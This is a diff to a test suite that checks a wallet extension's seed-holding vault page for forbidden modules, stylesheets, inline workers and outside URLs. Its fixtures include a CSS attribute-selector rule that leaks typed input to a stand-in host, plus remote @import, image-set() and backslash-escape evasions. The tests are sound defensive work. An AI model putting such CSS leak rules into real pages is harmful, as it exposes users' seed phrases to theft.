@@ -492,6 +492,9 @@ describe('vault isolation (built output)', () => {
     ['e.responseType="document"', 'responseType'],
     ['new Blob([t],{type:"text/html"})', 'text/html'],
     ['URL.createObjectURL(t)', 'createObjectURL'],
+    // Fix round 3 (N2): how Vite starts an inline worker (`?worker&inline`), which the module map cannot
+    // tie to the vault page — this name is the incidental backstop.
+    ['new Worker(URL.createObjectURL(new Blob([atob(t)],{type:"text/javascript;charset=utf-8"})))', 'createObjectURL'],
   ])('fails when a chunk the vault page loads names a markup sink: %s', (code, sink) => {
     write('assets/base-1.js', `export const n=(e,t)=>{${code}};`);
     expect(bundleViolations(dir)).toEqual([`assets/base-1.js (reachable from unlock.html) names a markup sink (${sink}) — the vault page sets text only`]);
@@ -520,12 +523,34 @@ describe('vault isolation (built output)', () => {
   });
 
   // Fix round 2: the authoritative backstop — what the bundler itself says each chunk carries.
+  // The map's shape (vite.config.ts): chunks, the stylesheets each chunk loads, what each stylesheet was
+  // built from, and each sheet's raw @import/url() targets.
   const MAP = () => ({
-    'assets/unlock-1.js': ['../core/keys/mnemonic.ts', 'node_modules/@scure/bip39/index.js', 'src/unlock/main.ts', 'src/unlock/unlock.css', 'src/vault/envelope.ts', 'unlock.html'],
-    'assets/base-1.js': ['node_modules/@scure/base/index.js'],
-    'assets/popup-1.js': ['src/app/popup.tsx', 'node_modules/react/index.js'],
+    chunks: {
+      'assets/unlock-1.js': ['../core/keys/mnemonic.ts', 'node_modules/@scure/bip39/index.js', 'src/unlock/main.ts', 'src/unlock/unlock.css', 'src/vault/envelope.ts', 'unlock.html'],
+      'assets/base-1.js': ['../web/src/styles/design-system.css', 'node_modules/@scure/base/index.js', 'src/styles/design-ext.css'],
+      'assets/popup-1.js': ['src/app/popup.tsx', 'node_modules/react/index.js', 'src/app/app.css'],
+    },
+    chunkCss: {'assets/unlock-1.js': ['assets/unlock-1.css'], 'assets/base-1.js': ['assets/base-1.css'], 'assets/popup-1.js': ['assets/popup-1.css']},
+    css: {
+      'assets/unlock-1.css': ['src/unlock/unlock.css'],
+      'assets/base-1.css': ['../web/src/styles/design-system.css', 'src/styles/design-ext.css'],
+      'assets/popup-1.css': ['src/app/app.css'],
+    },
+    cssRefs: {
+      '../web/src/styles/design-system.css': {imports: [], urls: ['/fonts/Geist-Variable.woff2', '/fonts/GeistMono-Variable.woff2']},
+      'src/styles/design-ext.css': {imports: [], urls: []},
+      'src/unlock/unlock.css': {imports: [], urls: []},
+      'src/app/app.css': {imports: [], urls: []},
+    },
   });
+  const sheets = () => {
+    write('assets/unlock-1.css', '[hidden]{display:none!important}');
+    write('assets/base-1.css', '@font-face{src:url(../fonts/Geist-Variable.woff2)format("woff2")}@font-face{src:url(../fonts/GeistMono-Variable.woff2)}');
+    write('assets/popup-1.css', '.x{background:url(data:image/png;base64,AA)}');
+  };
   it('passes when every module of every chunk the vault page loads is vault-page code or one of its packages', () => {
+    sheets();
     expect(vaultPageModuleViolations(dir, MAP())).toEqual([]);
   });
 
@@ -538,24 +563,92 @@ describe('vault isolation (built output)', () => {
     ['node_modules/@solana/web3.js/lib/index.browser.esm.js', 'assets/unlock-1.js'],
     ['\0virtual:app', 'assets/unlock-1.js'],
   ])('fails when a chunk the vault page loads carries %s', (id, chunk) => {
+    sheets();
     const map = MAP();
-    map[chunk] = [...map[chunk], id];
+    map.chunks[chunk] = [...map.chunks[chunk], id];
     expect(vaultPageModuleViolations(dir, map)).toEqual([`${chunk} (reachable from unlock.html) carries ${JSON.stringify(id)} — only vault-page code and its five packages may be bundled with the seed`]);
   });
 
   it('fails a reachable chunk missing from the map, a missing map, and a map that does not describe the vault page', () => {
+    sheets();
     const map = MAP();
-    delete map['assets/base-1.js'];
-    expect(vaultPageModuleViolations(dir, map)).toEqual(['assets/base-1.js (reachable from unlock.html) is not in the chunk module map — what it carries is unknown']);
-    expect(vaultPageModuleViolations(dir, undefined)).toEqual(['INCONCLUSIVE: no chunk module map (app.modules.json next to dist/app) — the build must write one']);
-    const empty = {...MAP(), 'assets/unlock-1.js': ['unlock.html']};
+    delete map.chunks['assets/base-1.js'];
+    delete map.chunkCss['assets/base-1.js'];
+    expect(vaultPageModuleViolations(dir, map)).toEqual([
+      'assets/base-1.js (reachable from unlock.html) is not in the chunk module map — what it carries is unknown',
+      "INCONCLUSIVE: no stylesheet unlock.html loads is built from ../web/src/styles/design-system.css — the map does not describe the vault page's styles",
+      "INCONCLUSIVE: no stylesheet unlock.html loads is built from src/styles/design-ext.css — the map does not describe the vault page's styles",
+    ]);
+    const NO_MAP = 'INCONCLUSIVE: no chunk module map (app.modules.json next to dist/app, with chunks, css, chunkCss and cssRefs) — the build must write one';
+    expect(vaultPageModuleViolations(dir, undefined)).toEqual([NO_MAP]);
+    // The round-2 shape (chunks only) is not a map of the styles: refused, not read as an empty one.
+    expect(vaultPageModuleViolations(dir, MAP().chunks)).toEqual([NO_MAP]);
+    const empty = MAP();
+    empty.chunks['assets/unlock-1.js'] = ['unlock.html'];
     expect(vaultPageModuleViolations(dir, empty)).toEqual(['INCONCLUSIVE: no chunk reachable from unlock.html carries src/unlock/main.ts in the module map — the check would pass trivially']);
   });
 
   it('UI code in a chunk only the popup loads is not the vault page’s (negative control)', () => {
+    sheets();
     const map = MAP();
-    map['assets/popup-1.js'].push('src/app/engine.ts');
+    map.chunks['assets/popup-1.js'].push('src/app/engine.ts');
+    map.cssRefs['src/app/app.css'] = {imports: ['./more.css'], urls: ['https://example.invalid/x.png']};
     expect(vaultPageModuleViolations(dir, map)).toEqual([]);
+  });
+
+  // Fix round 3 (N1): what the vault page's stylesheets were built from, and what they load.
+  it.each([
+    ['a stylesheet built from app.css', m => m.css['assets/unlock-1.css'].push('src/app/app.css'), [
+      'assets/unlock-1.css (loaded by unlock.html) is built from "src/app/app.css" — only ../web/src/styles/design-system.css, src/styles/design-ext.css, src/unlock/unlock.css may style the vault page',
+    ]],
+    ['a new src/styles/zz.css', m => {
+      m.css['assets/unlock-1.css'].push('src/styles/zz.css');
+      m.cssRefs['src/styles/zz.css'] = {imports: [], urls: []};
+    }, ['assets/unlock-1.css (loaded by unlock.html) is built from "src/styles/zz.css" — only ../web/src/styles/design-system.css, src/styles/design-ext.css, src/unlock/unlock.css may style the vault page']],
+    ['an @import in unlock.css (inlined: app.css is no module of its own)', m => {
+      m.cssRefs['src/unlock/unlock.css'].imports.push('../app/app.css');
+    }, ['assets/unlock-1.css (loaded by unlock.html): src/unlock/unlock.css @imports ../app/app.css — the vault page\'s sheets import nothing']],
+    ['a non-font url() in unlock.css', m => {
+      m.cssRefs['src/unlock/unlock.css'].urls.push('https://example.invalid/a');
+    }, ['assets/unlock-1.css (loaded by unlock.html): src/unlock/unlock.css loads url(https://example.invalid/a) — only the bundled Geist faces may be loaded']],
+    ['a font url() outside design-system.css', m => {
+      m.cssRefs['src/styles/design-ext.css'].urls.push('/fonts/Geist-Variable.woff2');
+    }, ['assets/base-1.css (loaded by unlock.html): src/styles/design-ext.css loads url(/fonts/Geist-Variable.woff2) — only the bundled Geist faces may be loaded']],
+    ['a sheet with no source record', m => {
+      delete m.cssRefs['src/unlock/unlock.css'];
+    }, ['assets/unlock-1.css (loaded by unlock.html): no source record for src/unlock/unlock.css — what it imports is unknown']],
+    ['a stylesheet missing from the map', m => {
+      delete m.css['assets/unlock-1.css'];
+    }, [
+      'assets/unlock-1.css (loaded by unlock.html) is not in the module map — what it was built from is unknown',
+      "INCONCLUSIVE: no stylesheet unlock.html loads is built from src/unlock/unlock.css — the map does not describe the vault page's styles",
+    ]],
+  ])('fails %s', (_name, change, expected) => {
+    sheets();
+    const map = MAP();
+    change(map);
+    expect(vaultPageModuleViolations(dir, map)).toEqual(expected);
+  });
+
+  it('checks the built text of the vault page’s stylesheets too: @import, and a url() that is not a Geist face', () => {
+    sheets();
+    write('assets/unlock-1.css', '@import url(https://example.invalid/x.css);input[value^="a"]{background:url(https://example.invalid/a)}');
+    expect(vaultPageModuleViolations(dir, MAP())).toEqual([
+      'assets/unlock-1.css (loaded by unlock.html) contains @import',
+      'assets/unlock-1.css (loaded by unlock.html) loads url(https://example.invalid/x.css) — only the bundled Geist faces may be loaded',
+      'assets/unlock-1.css (loaded by unlock.html) loads url(https://example.invalid/a) — only the bundled Geist faces may be loaded',
+    ]);
+  });
+
+  it('a stylesheet unlock.html links directly is checked as well', () => {
+    sheets();
+    write('unlock.html', '<!doctype html><html><head><link rel="stylesheet" href="./assets/extra-1.css"><script type="module" crossorigin src="./assets/unlock-1.js"></script></head></html>');
+    write('assets/extra-1.css', '.x{}');
+    const map = MAP();
+    map.css['assets/extra-1.css'] = ['src/app/app.css'];
+    expect(vaultPageModuleViolations(dir, map)).toEqual([
+      'assets/extra-1.css (loaded by unlock.html) is built from "src/app/app.css" — only ../web/src/styles/design-system.css, src/styles/design-ext.css, src/unlock/unlock.css may style the vault page',
+    ]);
   });
 
   it('is INCONCLUSIVE — a failure — when no built file carries the React 18 marker (React upgraded or gone)', () => {
@@ -880,6 +973,52 @@ describe('the vault page import allowlist', () => {
     expect(vaultPageViolations(read, exists)).toEqual(["src/unlock/main.ts: the vault page imports '' — a query, hash, scheme or computed specifier is refused, never skipped"]);
     const [read2, exists2] = tree({'src/unlock/main.ts': "const w = new Worker(new URL('../vault/kdf.worker.ts', import.meta.url), {type: 'module'});\nconst u = new URL('https://example.invalid/');", 'src/vault/kdf.worker.ts': ''});
     expect(vaultPageViolations(read2, exists2)).toEqual([]);
+  });
+
+  // Fix round 3 (N1): the vault page's stylesheets, by name, importing nothing, loading only the fonts.
+  const SHEETS = {
+    '../web/src/styles/design-system.css': "@font-face{src:url('/fonts/Geist-Variable.woff2')}@font-face{src:url(\"/fonts/GeistMono-Variable.woff2\")}",
+    'src/styles/design-ext.css': '.screen{display:flex}',
+    'src/unlock/unlock.css': '[hidden]{display:none!important}',
+  };
+  const STYLED = "import '../../../web/src/styles/design-system.css';\nimport '../styles/design-ext.css';\nimport './unlock.css';";
+
+  it('the three named sheets, importing nothing and loading only the Geist faces, pass (negative control)', () => {
+    const [read, exists] = tree({'src/unlock/main.ts': STYLED, ...SHEETS});
+    expect(vaultPageViolations(read, exists)).toEqual([]);
+  });
+
+  it.each([
+    ['@import in unlock.css', {'src/unlock/unlock.css': "@import '../app/app.css';\n[hidden]{display:none!important}"}, '', [
+      "src/unlock/unlock.css: the vault page's stylesheet uses @import — every sheet it loads is named in VAULT_PAGE_SHEETS",
+    ]],
+    ['@import url() in design-ext.css', {'src/styles/design-ext.css': '@import url("../app/app.css");'}, '', [
+      "src/styles/design-ext.css: the vault page's stylesheet uses @import — every sheet it loads is named in VAULT_PAGE_SHEETS",
+      "src/styles/design-ext.css: the vault page's stylesheet loads url(../app/app.css) — only the bundled Geist faces may be loaded",
+    ]],
+    ['a new src/styles/zz.css', {'src/styles/zz.css': '.x{}'}, "\nimport '../styles/zz.css';", ['the vault page reaches src/styles/zz.css — only vault-page code may be bundled with the seed']],
+    ['a new src/unlock/zz.css', {'src/unlock/zz.css': '.x{}'}, "\nimport './zz.css';", ['the vault page reaches src/unlock/zz.css — only vault-page code may be bundled with the seed']],
+    ['a non-font url() (an exfiltrating attribute selector)', {'src/unlock/unlock.css': 'input[value^="a"]{background:url(https://example.invalid/a)}'}, '', [
+      "src/unlock/unlock.css: the vault page's stylesheet loads url(https://example.invalid/a) — only the bundled Geist faces may be loaded",
+    ]],
+    ['a font url() in a sheet other than design-system.css', {'src/unlock/unlock.css': "@font-face{src:url('/fonts/Geist-Variable.woff2')}"}, '', [
+      "src/unlock/unlock.css: the vault page's stylesheet loads url(/fonts/Geist-Variable.woff2) — only the bundled Geist faces may be loaded",
+    ]],
+    ['image-set()', {'src/unlock/unlock.css': '.x{background:image-set("https://example.invalid/a" 1x)}'}, '', [
+      "src/unlock/unlock.css: the vault page's stylesheet uses image-set() — it loads URLs without url()",
+    ]],
+    ['an escaped url(', {'src/unlock/unlock.css': '.x{background:\\75rl(https://example.invalid/a)}'}, '', [
+      "src/unlock/unlock.css: the vault page's stylesheet uses a backslash escape — an escape can spell url( or @import",
+    ]],
+  ])('refuses %s', (_name, files, extra, expected) => {
+    const [read, exists] = tree({'src/unlock/main.ts': STYLED + extra, ...SHEETS, ...files});
+    expect(vaultPageViolations(read, exists)).toEqual(expected);
+  });
+
+  // Fix round 3 (N2): an inline worker is invisible to the module map; the source refuses its query.
+  it('refuses an inline worker import (?worker&inline) — the query is never a plain specifier', () => {
+    const [read, exists] = tree({'src/unlock/main.ts': "import KdfWorker from '../vault/kdf.worker?worker&inline';", 'src/vault/kdf.worker.ts': ''});
+    expect(vaultPageViolations(read, exists)).toEqual(["src/unlock/main.ts: the vault page imports '../vault/kdf.worker?worker&inline' — a query, hash, scheme or computed specifier is refused, never skipped"]);
   });
 
   it('does not follow a type-only import, nor prose that looks like one', () => {
